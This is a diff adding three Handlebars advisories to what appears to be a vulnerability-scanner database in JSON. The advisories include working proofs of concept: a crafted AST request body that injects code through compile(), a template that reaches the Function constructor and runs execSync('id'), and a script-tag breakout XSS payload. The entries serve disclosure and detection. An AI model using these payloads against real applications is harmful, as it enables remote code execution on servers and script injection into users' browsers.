@@ -5143,6 +5143,74 @@
           "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-7rx3-28cr-v5wh",
           "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9"
         ]
+      },
+      {
+        "atOrAbove": "4.0.0",
+        "below": "4.7.10",
+        "severity": "critical",
+        "cwe": [
+          "CWE-843",
+          "CWE-94"
+        ],
+        "identifiers": {
+          "summary": "Handlebars: JavaScript Injection via AST Type Confusion in compile (bypass of CVE-2026-33937)",
+          "githubID": "GHSA-8r5x-fm3f-whwj",
+          "CVE": [
+            "CVE-2026-106446"
+          ]
+        },
+        "details": "## Summary\n\n`Handlebars.compile()` and `Handlebars.precompile()` accept a pre-parsed AST as well as a template string. Handlebars 4.7.9 added validation for such ASTs. It only checks values on `PathExpression`, `NumberLiteral` and `BooleanLiteral` nodes, and the compiler still writes several other AST values into the generated JavaScript unchecked.\n\nIf an application passes an untrusted object to `compile()` or `precompile()`, such as a parsed JSON request body, that object can carry arbitrary JavaScript. With `compile()`, the code runs on the server when the template renders. With `precompile()`, it ends up in the precompiled output and runs wherever that output is loaded.\n\nApplications that only ever pass template **strings** are not affected.\n\nThis bypasses the AST validation added in 4.7.9 for GHSA-2w6w-674q-4c4q, GHSA-xhpv-hc6g-r9c6 and GHSA-3mfm-83xf-c92r.\n\n## Details\n\nThe 4.7.9 validator runs in `parseWithoutProcessing()` and walks the whole AST. It only checks values on nodes whose `type` is `PathExpression`, `NumberLiteral` or `BooleanLiteral`. It passes over plain objects without a `type`, and over strings and other non-object values. The compiler reads these values from other places and writes them into the generated code as-is:\n\n| AST value | Written into generated code as | Compile options needed |\n| --- | --- | --- |\n| `Program.blockParams.length` | `container.program(<index>, data, <length>)` | none (default options) |\n| `depth` on a param that is not a `PathExpression`, e.g. a `StringLiteral` | `depths[<depth>]` | `stringParams: true` |\n| A `StringLiteral.value` that is not a string | raw JavaScript literal | `stringParams: true` |\n| A `PathExpression.original` that is not a string | raw JavaScript literal | `stringParams: true` |\n\nThe first row works with default options. A `Program` with `blockParams: { \"length\": \"<JS expression>\" }` passes validation because:\n\n1. the `blockParams` object has no `type`, so none of the type-specific checks apply, and\n2. the walker skips the string under `length` because it is not an object.\n\nThe compiler then reads `program.blockParams.length` and writes the string directly into the template function. The `container.program(...)` call is part of the helper options object, which is built before the helper is looked up. The code therefore runs on render even if the block's helper does not exist.\n\n## Proof of Concept\n\n1. Start a server that compiles request input:\n\n```js\nimport express from \"express\";\nimport Handlebars from \"handlebars\";\n\nconst app = express();\napp.use(express.json());\n\napp.post(\"/api/render\", (req, res) => {\n  const template = Handlebars.compile(req.body.text); // `text` may be an object, not a string\n  res.send(template());\n});\n\napp.listen(2123);\n```\n\n2. Save this request body as `poc.json`. `missingHelper` does not need to exist:\n\n```json\n{\n  \"text\": {\n    \"type\": \"Program\",\n    \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } },\n    \"body\": [\n      {\n        \"type\": \"BlockStatement\",\n        \"path\": {\n          \"type\": \"PathExpression\", \"data\": false, \"depth\": 0,\n          \"parts\": [\"missingHelper\"], \"original\": \"missingHelper\",\n          \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n        },\n        \"params\": [],\n        \"program\": {\n          \"type\": \"Program\",\n          \"blockParams\": {\n            \"length\": \"(()=>{throw new Error('Injected code ran as uid ' + process.getuid())})()\"\n          },\n          \"body\": [],\n          \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n        },\n        \"openStrip\": { \"open\": false, \"close\": false },\n        \"inverseStrip\": { \"open\": false, \"close\": false },\n        \"closeStrip\": { \"open\": false, \"close\": false },\n        \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n      }\n    ]\n  }\n}\n```\n\n3. Send the request:\n\n```sh\ncurl -s -X POST 'http://127.0.0.1:2123/api/render' \\\n     -H 'Content-Type: application/json' --data-binary @poc.json\n```\n\nThe server responds with HTTP 500 and an error page showing the injected code ran inside the Node.js process:\n\n```\nError: Injected code ran as uid 1000\n```\n\n## Impact\n\nAn application is affected if untrusted input can reach `Handlebars.compile()` or `Handlebars.precompile()` as an object instead of a string. A common way this happens is passing a field from a JSON request body straight to `compile()`.\n\n- **`compile()`**: arbitrary JavaScript runs in the Node.js process with the application's privileges (remote code execution).\n- **`precompile()`**: the injected code is written into the precompiled template and runs wherever that template is loaded, for example in users' browsers.\n\n\n## Workarounds\n\n- **Validate input type** before calling `Handlebars.compile()`: ensure the argument is always a  `string`, never a plain object or JSON-deserialized value.\n  ```javascript\n  if (typeof templateInput !== 'string') {\n    throw new TypeError('Template must be a string');\n  }\n  ```\n- Use the Handlebars **runtime-only** build (`handlebars/runtime`) on the server if templates are  pre-compiled at build time; `compile()` will be unavailable.\n\n## Credits\n\n### Variant `Program.blockParams`\n- [Nick Mykhailyshyn - @whoareme](https://x.com/whoareme33)\n- [jmoritzc53 ](https://github.com/jmoritzc53)\n- [bhaswanthc ](https://github.com/bhaswanthc)\n- [dinhvaren ](https://github.com/dinhvaren)\n- [n0tra4e ](https://github.com/n0tra4e) \n- [PellaML](https://github.com/PellaML)\n- [kustundag](https://github.com/kustundag)\n- [kagebunsher](https://github.com/kagebunsher)\n- [sanmatte](https://github.com/sanmatte)\n\n### Variant `BooleanLiteral|NumberLiteral.value`\n\n- [sondt99 ](https://github.com/sondt99) Thai Son Dinh from VinSOC Labs (R&D)\n- [Ahmed-Elmahgob ](https://github.com/Ahmed-Elmahgob)\n- [nikolakojic-rasit ](https://github.com/nikolakojic-rasit)\n- [vk-can](https://github.com/vk-can)\n- [shenhuanageshei](https://github.com/shenhuanageshei)\n- [kustundag](https://github.com/kustundag)\n- [kagebunsher](https://github.com/kagebunsher)\n- [ffasterss](https://github.com/ffasterss)\n\n### Variant `PathExpression.depth`\n\n- [hibrian827](https://github.com/hibrian827) Team Atlanta\n- [oss-security-shopify](https://github.com/oss-security-shopify)",
+        "info": [
+          "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-8r5x-fm3f-whwj",
+          "https://github.com/handlebars-lang/handlebars.js/pull/2185",
+          "https://github.com/handlebars-lang/handlebars.js/commit/703fdcc5fd6cc8d1cc0c33cc19de40c467c4b8d2",
+          "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10"
+        ]
+      },
+      {
+        "atOrAbove": "4.0.0",
+        "below": "4.7.10",
+        "severity": "critical",
+        "cwe": [
+          "CWE-1289",
+          "CWE-184"
+        ],
+        "identifiers": {
+          "summary": "Handlebars: JavaScript Injection via Own Property Check Bypass",
+          "githubID": "GHSA-p8wg-vrv2-v86f",
+          "CVE": [
+            "CVE-2026-106445"
+          ]
+        },
+        "details": "## Summary\n\nHandlebars can expose the `Function` constructor despite its prototype-access deny list. When a template reaches `Function.prototype`, its own `constructor` property is returned before the deny list is checked. An attacker who can render a controlled template with `allowProtoMethodsByDefault: true` can inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.\n\n## Description\n\n`lookupProperty` trusts own properties:\n\n```js\nif (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n  return result;\n}\n```\n\nNormally, prototype-derived values reach `resultIsAllowed`, which blocks dangerous method names such as `constructor`. However, `constructor` is itself an own property of prototype objects:\n\n```js\nFunction.prototype.constructor === Function;\nString.prototype.constructor === String;\nObject.prototype.constructor === Object;\n```\n\nAs a result, once a template reaches `Function.prototype`, looking up `constructor` returns `Function` without consulting the deny list.\n\n## Proof of Concept\n\nAn attacker needs to reach any prototype object where constructor is an own property, then access constructor to obtain Function. The shortest path requires only an accessible function in the template context:\n\n1. Access a function's prototype: {{lookup myFunction \"proto\"}} resolves to Function.prototype. The proto property is not in the deny list and is permitted when allowProtoMethodsByDefault is true (since the result is a function).\n2. Access constructor via own property bypass: {{lookup (lookup myFunction \"\\_\\_proto__\") \"constructor\"}} resolves to Function. Because Function.prototype.constructor is an own property of Function.prototype, hasOwnProperty returns true and lookupProperty returns the value without calling resultIsAllowed. The deny list entry constructor: false is never evaluated.\n3. Construct and execute arbitrary code: The attacker uses Function to create a function with attacker-controlled body content and triggers its execution through Handlebars' template rendering mechanics (e.g., #with calling functions, lambda processing, or #each iteration combined with apply).\n\n```javascript\nconst Handlebars = require('handlebars');\n\n// constructor deny list bypass via hasOwnProperty check in lookupProperty\nconst template = Handlebars.compile(\n    // construct code array from template string literal\n    '{{#with a}}' +\n      '{{lookup \"\" (push \"return process.mainModule.require(\\'child_process\\').execSync(\\'id\\').toString()\")}}' +\n      '{{lookup \"\" (pop)}}' +\n      '{{lookup \"\" (shift)}}' +\n    '{{/with}}' +\n\n    // access Function via own property bypass on Function.prototype.constructor\n    '{{lookup \"\" (@root.a.push (lookup (lookup fn \"__proto__\") \"constructor\"))}}' +\n\n    // #each sets depth0=Function without calling it, apply avoids hash body\n    '{{#each @root}}{{#if @index}}{{else}}' +\n      '{{#with (this.apply null @root.a)}}{{this}}{{/with}}' +\n    '{{/if}}{{/each}}'\n);\n\nconst result = template(\n    { fn: function(){}, a: [0] },\n    { allowProtoMethodsByDefault: true }\n);\n\nconsole.log(result.trim());\n\n// output: uid=1000(node) gid=1000(node) groups=1000(node)\n```\n\n## Workarounds\n\nDo not set `allowProtoMethodsByDefault: true` when compiling untrusted templates with untrusted data.",
+        "info": [
+          "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-p8wg-vrv2-v86f",
+          "https://github.com/handlebars-lang/handlebars.js/pull/2185",
+          "https://github.com/handlebars-lang/handlebars.js/commit/ceec388abe1d1aac8f6369860d5f390fa71ef4fa",
+          "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10"
+        ]
+      },
+      {
+        "atOrAbove": "4.0.0",
+        "below": "4.7.10",
+        "severity": "medium",
+        "cwe": [
+          "CWE-116"
+        ],
+        "identifiers": {
+          "summary": "Handlebars: JavaScript Injection via Unsafe Inline Embedding of Precompiled Templates",
+          "githubID": "GHSA-xw65-4hp5-5hc7",
+          "CVE": [
+            "CVE-2026-106444"
+          ]
+        },
+        "details": "## Summary\n\n`Handlebars.precompile()` generates JavaScript source that is commonly embedded in browser `<script>` elements. Before the fix, static template text containing `</script>` was emitted unchanged. HTML parsers recognize `</script>` even inside a JavaScript string literal, closing the surrounding script element and allowing following attacker-controlled markup to be parsed and executed.\n\nThis affects applications that precompile attacker-controlled templates and embed the generated source directly in an HTML `<script>` element. It does not affect ordinary server-side rendering or precompiled templates delivered as external JavaScript files.\n\n## Details\n\nStatic text is serialized by `quotedString()` in `lib/handlebars/compiler/code-gen.js`. The generated JavaScript is valid, but JavaScript quoting alone does not make it safe to embed in HTML. In HTML script data, the sequence `</script>` terminates the element regardless of JavaScript string context.\n\nOn affected releases, this template:\n\n```handlebars\nsafe</script><script>alert(\"XSS\")</script><script>\n```\n\ncould produce generated source containing:\n\n```js\nreturn 'safe</script><script>alert(\"XSS\")</script><script>';\n```\n\nWhen included inline in an HTML document, the first `</script>` closes the script containing the precompiled template. The next `<script>` element is then parsed as HTML and executes.\n\n## Proof of Concept\n\n```js\nconst Handlebars = require('handlebars');\n\nconst template = 'safe</script><script>alert(\"XSS\")</script><script>';\nconst output = Handlebars.precompile(template);\n\nconsole.log(output.includes('</script>'));\n```\n\nAffected versions print `true`. Embedding `output` directly in an inline `<script>` element allows the injected script tag to be parsed by the browser.\n\n## Workarounds\n\n- Do not inline precompiled output from untrusted templates into HTML documents.\n- Serve generated precompiled templates as external JavaScript files where practical.\n\n## Credits\n\nReported by Curly-Haired-Baboon Aka Laplas",
+        "info": [
+          "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-xw65-4hp5-5hc7",
+          "https://github.com/handlebars-lang/handlebars.js/pull/2185",
+          "https://github.com/handlebars-lang/handlebars.js/commit/609d1b11c833c9a3e00f56f2f34d22f425446725",
+          "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10"
+        ]
       }
     ],
     "extractors": {
